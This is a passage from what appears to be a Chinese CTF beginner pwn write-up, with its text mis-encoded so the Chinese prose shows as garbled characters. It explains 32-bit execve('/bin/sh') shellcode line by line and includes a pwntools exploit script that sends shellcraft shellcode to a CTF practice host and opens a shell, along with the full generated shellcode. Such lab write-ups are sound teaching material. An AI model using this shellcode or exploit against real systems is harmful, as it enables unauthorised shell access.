&lt;p&gt;â‘  &lt;code&gt;mov eax, 0xb&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eax&lt;/code&gt;å¯„å­˜å™¨åœ¨ 32 ä½ Linux ç³»ç»Ÿè°ƒç”¨ä¸­ä¸“é—¨ç”¨äºä¼ é€’ â€œç³»ç»Ÿè°ƒç”¨å·â€ï¼ˆå‘Šè¯‰å†…æ ¸è¦æ‰§è¡Œå“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0xb&lt;/code&gt;æ˜¯åå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶æ˜¯&lt;code&gt;11&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;11&lt;/code&gt;æ­£æ˜¯&lt;code&gt;execve&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç¼–å·ï¼ˆå†…æ ¸é€šè¿‡è¿™ä¸ªå€¼è¯†åˆ«è¦æ‰§è¡Œ&lt;code&gt;execve&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘¡ &lt;code&gt;mov ecx, 0&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ecx&lt;/code&gt;å¯„å­˜å™¨ç”¨äºä¼ é€’&lt;code&gt;execve&lt;/code&gt;çš„ç¬¬äºŒä¸ªå‚æ•°&lt;code&gt;argv&lt;/code&gt;ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;ä¼ &lt;code&gt;0&lt;/code&gt;ï¼ˆå³&lt;code&gt;NULL&lt;/code&gt;ï¼‰è¡¨ç¤º â€œæ²¡æœ‰å‚æ•°â€ï¼Œç­‰ä»·äºåœ¨å‘½ä»¤è¡Œç›´æ¥è¾“å…¥&lt;code&gt;/bin/sh&lt;/code&gt;ï¼ˆä¸å¸¦ä»»ä½•å‚æ•°ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘¢ &lt;code&gt;mov edx, 0&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;edx&lt;/code&gt;å¯„å­˜å™¨ç”¨äºä¼ é€’&lt;code&gt;execve&lt;/code&gt;çš„ç¬¬ä¸‰ä¸ªå‚æ•°&lt;code&gt;envp&lt;/code&gt;ï¼ˆç¯å¢ƒå˜é‡åˆ—è¡¨ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;ä¼ &lt;code&gt;0&lt;/code&gt;ï¼ˆå³&lt;code&gt;NULL&lt;/code&gt;ï¼‰è¡¨ç¤º â€œæ²¡æœ‰ç¯å¢ƒå˜é‡â€ï¼Œå†…æ ¸ä¼šä½¿ç”¨é»˜è®¤ç¯å¢ƒå˜é‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘£ &lt;code&gt;push 0x0068732f&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;push&lt;/code&gt;æŒ‡ä»¤å°†æ•°æ®å‹å…¥æ ˆä¸­ï¼ˆæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„å†…å­˜åŒºåŸŸï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0068732f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ˜¯åå…­è¿›åˆ¶çš„ â€œå°ç«¯åºâ€ å­˜å‚¨ï¼ˆx86 æ¶æ„é»˜è®¤å°ç«¯åºï¼Œå³ä½åœ°å€å­˜ä½ä½å­—èŠ‚ï¼‰ï¼Œè½¬æ¢ä¸º ASCII ç ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x2f&lt;/code&gt; â†’ &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x73&lt;/code&gt; â†’ &lt;code&gt;s&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x68&lt;/code&gt; â†’ &lt;code&gt;h&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x00&lt;/code&gt; â†’ å­—ç¬¦ä¸²ç»“æŸç¬¦&lt;code&gt;\0&lt;/code&gt;
æ‰€ä»¥è¿™è¡Œå®é™…æ˜¯å¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²&lt;code&gt;&amp;quot;/sh\0&amp;quot;&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘¤ &lt;code&gt;push 0x6e69622f&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;åŒæ ·æ˜¯å‹æ ˆæ“ä½œï¼Œ&lt;code&gt;0x6e69622f&lt;/code&gt;è½¬æ¢ä¸º ASCII ç ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x2f&lt;/code&gt; â†’ &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x62&lt;/code&gt; â†’ &lt;code&gt;b&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x69&lt;/code&gt; â†’ &lt;code&gt;i&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x6e&lt;/code&gt; â†’ &lt;code&gt;n&lt;/code&gt;
æ‰€ä»¥è¿™è¡Œå¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²&lt;code&gt;&amp;quot;/bin&amp;quot;&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»“åˆä¸Šä¸€è¡Œï¼Œæ ˆä¸Šç°åœ¨çš„å†…å®¹æ˜¯&lt;code&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/code&gt;ï¼ˆå› ä¸ºæ ˆå…ˆå‹å…¥&lt;code&gt;&amp;quot;/bin&amp;quot;&lt;/code&gt;ï¼Œå†å‹å…¥&lt;code&gt;&amp;quot;/sh\0&amp;quot;&lt;/code&gt;ï¼Œæ ˆé¡¶åˆ°æ ˆåº•çš„é¡ºåºå°±æ˜¯&lt;code&gt;/b/i/n//s/h/\0&lt;/code&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘¥ &lt;code&gt;mov ebx, esp&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;esp&lt;/code&gt;æ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ°¸è¿œæŒ‡å‘å½“å‰æ ˆé¡¶çš„åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;ç»è¿‡ä¸¤æ¬¡&lt;code&gt;push&lt;/code&gt;åï¼Œæ ˆé¡¶æ­£å¥½æ˜¯&lt;code&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/code&gt;å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦&lt;code&gt;&#39;/&#39;&lt;/code&gt;çš„ä½ç½®ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;è¿™è¡ŒæŒ‡ä»¤å°†æ ˆé¡¶åœ°å€å­˜å…¥&lt;code&gt;ebx&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;ebx&lt;/code&gt;å¯„å­˜å™¨åœ¨&lt;code&gt;execve&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨ä¸­ç”¨äºä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°&lt;code&gt;filename&lt;/code&gt;ï¼ˆç¨‹åºè·¯å¾„ï¼‰ï¼Œæ‰€ä»¥&lt;code&gt;ebx&lt;/code&gt;ç°åœ¨æŒ‡å‘æˆ‘ä»¬è¦æ‰§è¡Œçš„&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â‘¦ &lt;code&gt;int 0x80&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;int&lt;/code&gt;æ˜¯ä¸­æ–­æŒ‡ä»¤ï¼Œ&lt;code&gt;0x80&lt;/code&gt;æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­å·ã€‚&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ä¼šè§¦å‘ä¸€ä¸ªè½¯ä¸­æ–­ï¼Œè®© CPU ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œå†…æ ¸ä¼šæ ¹æ®&lt;code&gt;eax&lt;/code&gt;ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆ&lt;code&gt;11&lt;/code&gt;ï¼‰æ‰§è¡Œ&lt;code&gt;execve&lt;/code&gt;ï¼Œå¹¶ä½¿ç”¨&lt;code&gt;ebx&lt;/code&gt;ã€&lt;code&gt;ecx&lt;/code&gt;ã€&lt;code&gt;edx&lt;/code&gt;ä¸­çš„å‚æ•°ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ€»ä¹‹ï¼šå¿…é¡»è¦å®šä¹‰å¥½è¿™å‡ ä¸ªå¯„å­˜å™¨ï¼Œåœ¨æœ€åº•å±‚æ“ä½œç³»ç»Ÿè¿è¡Œæ—¶éƒ½ä¼šç”¨åˆ°çš„ï¼Œè¿™é‡Œä¸è¯¦ç»†è®²è¿°ï¼Œåæ­£ä½ çŸ¥é“è¿™å‡ ä¸ªå¯„å­˜å™¨ä¸€å¼€å§‹å°±å¾—è¿™ä¹ˆå®šä¹‰å°±å¥½å•¦ã€‚ï¼ˆä¸è€çƒ¦äº†ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;pushå‹æ ˆæ—¶è¦è®°å¾—å­—èŠ‚é™åˆ¶ï¼Œå› ä¸ºæ¶æ„æ˜¯x32ï¼Œæ‰€ä»¥pushæœ€å¤š4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯pushä¸¤ä¸ªï¼š/binã€/shçš„åœ°å€ï¼ˆä¸æ»¡å››ä¸ªå­—èŠ‚å¦‚/shè¦è®°å¾—ç”¨00å¡«æ»¡å“¦ä¸ç„¶ä¼šæŠ¥é”™ï¼‰&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æ˜¯è®°å¾—espå¯„å­˜å™¨æ˜¯åŠ¨æ€çš„&amp;hellip;&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œä¼šè¾“å‡ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)  # æœ¬åœ°è°ƒè¯•æ—¶å¯ç”¨ï¼Œç”¨äºå¯åŠ¨æœ¬åœ°çš„pwnç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28183&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡ï¼Œåœ°å€ä¸ºpwn.challenge.ctf.showï¼Œç«¯å£28183&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œ/bin/shçš„shellcode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# å°†shellcodeå‘é€ç»™ç›®æ ‡æœåŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œå…è®¸ç”¨æˆ·ä¸ç›®æ ‡æœåŠ¡è¿›è¡Œäº¤äº’ï¼ˆå¦‚æ‰§è¡Œå‘½ä»¤ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™æ˜¯å®ƒçš„shellcodeï¼ˆåŸç‰ˆæœªä¿®æ”¹è¿‡ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ä¸Šæ¥çš„ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* execve&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin///sh&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push b&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin///sh\x00&amp;#39;&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x68
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x732f2f2f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x6e69622f
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mov ebx, esp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push argument array &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push &lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00\x00&amp;#39;&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x1010101
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor dword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;esp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, 0x1016972
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor ecx, ecx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push ecx /* null terminate */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pop ecx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        add ecx, esp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push ecx /* &lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00&amp;#39;&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mov ecx, esp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor edx, edx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* call execve&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; /* 0xb */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pop eax
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        int 0x80
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65.png&#34;
	width=&#34;1030&#34;
	height=&#34;560&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è°ƒç”¨pwntoolsæ‰€äº§ç”Ÿçš„shellcode&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;441px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹ç€ç¡®å®æ¯”è¾ƒä¹±&amp;hellip;..ğŸ˜…&lt;/p&gt;
&lt;p&gt;æœ€åçš„æœ€åæˆ‘æƒ³å¯¹è¿™é¢˜åšäº›è¯„ä»·ï¼Œå…¶å®é¢˜ä¸éš¾ä¸»è¦æ˜¯æˆ‘åˆæ¬¡åšï¼Œè®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œå¦‚æœä½ ä¼šæ‰‹æ•²shellcodeæˆ–è€…è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„è¯è¿˜æ˜¯å¾ˆç®€å•ç§’æ‰çš„ã€‚åªèƒ½æ€ªå°ç”Ÿå¤ªcaiäº†ğŸ˜„&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67.png&#34;
	width=&#34;856&#34;
	height=&#34;304&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é¡ºåˆ©å®Œæˆexecveç³»ç»Ÿè°ƒç”¨ï¼Œå¾—ä»¥è¿›è¡Œäº¤äº’&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;281&#34;
		data-flex-basis=&#34;675px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¤§è‡´æ€è·¯çŸ¥é“å°±å¥½ï¼Œé¶æœºçš„flagæ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_025&#34;&gt;PWN_025
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_025&#34; &gt;PWN_025&lt;/a&gt;&lt;/p&gt;
